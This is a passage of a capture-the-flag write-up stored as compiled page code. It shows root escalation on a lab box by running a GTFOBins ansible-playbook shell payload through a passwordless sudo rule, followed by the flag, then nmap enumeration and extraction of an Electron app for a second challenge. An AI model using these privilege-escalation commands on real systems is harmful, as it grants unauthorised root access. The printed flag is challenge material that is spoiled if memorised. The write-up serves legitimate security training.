number\",children:\"443\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"export\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:(0,e.jsx)(n.span,{className:\"token environment constant\",children:\"TERM\"})}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`xterm\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"export\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:(0,e.jsx)(n.span,{className:\"token environment constant\",children:\"TERM\"})}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`xterm\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then, I\\u2019ll check if we have any sudo rights:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),` -l\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Matching Defaults entries \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),` john on beautycare:\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    env_reset, mail_badpass,\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"secure_path\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"/usr/local/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/local/bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/usr/bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/sbin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\":/bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),`:/snap/bin\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`User john may run the following commands on beautycare:\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` NOPASSWD: /usr/bin/ansible-playbook\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@beautycare:~$\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I just searched this binary in gtfobins and grabbed:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh \u003c/dev/tty \u003e/dev/tty 2\u003e/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.a,{href:\"https://gtfobins.github.io/gtfobins/ansible-playbook/\",children:\"https://gtfobins.github.io/gtfobins/ansible-playbook/\"})}),`\n`]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh \u003c/dev/tty \u003e/dev/tty 2\u003e/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"TF\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsxs)(n.span,{className:\"token variable\",children:[(0,e.jsx)(n.span,{className:\"token variable\",children:\"$(\"}),\"mktemp\",(0,e.jsx)(n.span,{className:\"token variable\",children:\")\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'[{hosts: localhost, tasks: [shell: /bin/sh \u003c/dev/tty \u003e/dev/tty 2\u003e/dev/tty]}]'\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"john@beautycare:~$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"sudo\"}),\" /usr/bin/ansible-playbook \",(0,e.jsx)(n.span,{className:\"token variable\",children:\"$TF\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"WARNING\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`: provided hosts list is empty, only localhost is available. Note that\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"the implicit localhost does not match \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'all'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"PLAY \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"localhost\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` **************************************************************\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TASK \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"Gathering Facts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` *********************************************************\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"ok: \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"localhost\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"TASK \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"shell\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` *******************************************************************\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# id\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"id\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"uid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"gid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"groups\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# cat /root/root.txt\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"cat\"}),` /root/root.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STF22\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"3f62f62107c411482f5bc8caff1843e2\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And that\\u2019s it \\\\o/\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"electrogrid-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#electrogrid-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Electrogrid (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We started with a simple \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the basic options:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB nmap -sC -sV \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.228.64 -v\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"9000\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),`  cslistener?\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),` fingerprint-strings:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LPDString, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"400\"}),` Bad Request\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   FourOhFourRequest:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:20 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   GetRequest, HTTPOptions:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:13 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`   RTSPRequest:\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     HTTP/1.1 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),` Not Found\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Type: application/json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"charset\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`utf-8\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"     Date: Mon, 05 Dec \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),` 09:45:14 GMT\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),`     Connection: close\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\"_    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"404 page not found\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We just have port 9000 open in this case, which seems like an API. Nothing interesting here for now!\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"We are provided with \",(0,e.jsx)(n.code,{children:\"UserLandCityPC-1.0.0.AppImage\"}),\". We can start by unpacking/unarchiving it using \",(0,e.jsx)(n.code,{children:\"7z\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/userland \\xBB 7z x UserLandCityPC-1.0.0.AppImage\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"SNIP\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Archives with Warnings: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Warnings: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Folders: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"19\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Files: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"89\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Size:       \",(0,e.jsx)(n.span,{className:\"token number\",children:\"243843126\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Compressed: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"95369065\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`AppRun                  chrome_crashpad_handler  libEGL.so     libvk_swiftshader.so  LICENSES.chromium.html  resources.pak      UserLandCityPC-1.0.0.AppImage  usr\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`chrome_100_percent.pak  chrome-sandbox           libffmpeg.so  libvulkan.so.1        locales                 snapshot_blob.bin  userlandcitypc.desktop         v8_context_snapshot.bin\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`chrome_200_percent.pak  icudtl.dat               libGLESv2.so  LICENSE.electron.txt  resources               userlandcitypc     userlandcitypc.png             vk_swiftshader_icd.json\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Checking the \",(0,e.jsx)(n.code,{children:\"resources\"}),\" folder we can find an \",(0,e.jsx)(n.code,{children:\"asar\"}),\" file:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland \\xBB \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` resources\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`app.asar\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"An \",(0,e.jsx)(n.code,{children:\"asar\"}),\" file is a package file used by the Electron framework to store application code and other assets. So at this point, we\\u2019ll know that we\\u2019ll be dealing with an electron application.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"I\\u2019ll use the following command to extract its content:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsx)(n.code,{className:\"language-bash code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`npx asar extract app.asar extract\n`})})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources \\xBB \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` extract\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp/userland/resources/extract \\xBB \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ls\"}),` -la\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"total \",(0,e.jsx)(n.span,{className:\"token number\",children:\"40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" 04:58 \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\".\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwx------  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),\" 04:58 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"713\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 index.html\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1488\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 index.js\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x \",(0,e.jsx)(n.span,{className:\"token number\",children:\"20\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 node_modules\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"377\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 package.json\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"783\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 preload.js\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 src\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"drwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4096\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 static\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"-rwxr-xr-x  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" hcue hcue \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1029\"}),\" Dec  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"5\"}),` 04:58 webpack.common.js\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Checking the \",(0,e.jsx)(n.code,{children:\"index.js\"}),\" file, we can notice an interesting function that is being called:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"ipcMain\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"on\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'handle-links'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsxs)(n.span,{className:\"token parameter\",children:[\"event\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" task\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" url\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"task \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"===\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'download'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" downloadPath \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/opt/userland/'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" filename \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"split\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function 